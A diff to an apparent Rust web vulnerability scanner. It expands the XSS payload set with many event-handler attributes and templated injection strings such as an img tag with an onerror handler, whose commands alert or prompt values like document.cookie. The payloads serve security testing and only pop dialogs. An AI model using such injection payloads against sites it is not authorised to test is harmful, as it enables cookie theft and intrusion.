@@ -31,10 +31,24 @@ impl Scanner {
     pub fn load_config(&mut self) {
         self.payloads.push(Payloads::XSS(
                 XssPayloads{
-                    attr: vec!["onerror".to_string(), "onload".to_string()],
-                    html_tags: vec!["script".to_string(), "img".to_string()],
+                    attr: vec![
+                        "onmouseover".to_string(), 
+                        "onmouseenter".to_string(),
+                        "onmouseleave".to_string(),
+                        "onmouseout".to_string(),
+                        "onclick".to_string(),
+                        "onmousedown".to_string(),
+                        "onmouseup".to_string(),
+                        "ontouchstart".to_string(),
+                        "ontouchend".to_string(),
+                        "ontouchmove".to_string(),
+                        "onpointerenter".to_string(),
+                        "onpointerleave".to_string(),
+                        "onpointerover".to_string(),
+                    ],
+                    html_tags: vec!["<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(), "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),"<h1 $JS_FUNC$($JS_CMD)".to_string()],
                     js_cmd: vec!["alert".to_string(), "prompt".to_string()],
-                    js_value: vec!["document.cookie".to_string(), "document.location".to_string()],
+                    js_value: vec!["document.cookie".to_string(), "document.location".to_string(),"1".to_string()],
                 }
                 ));
     }
@@ -57,7 +71,10 @@ impl Scanner {
                     match module {
                         "xss" => {
                             let blocking_headers = valid_to_xss(request);
-                            if !blocking_headers {
+                            if blocking_headers.1 == true {
+                                let _ = &bar.println("NEED MANUAL CHECK");
+                            }
+                            if !blocking_headers.0 {
                                 for payload in self.payloads.iter() {
                                     match payload {
                                         Payloads::XSS(current_payload) => {
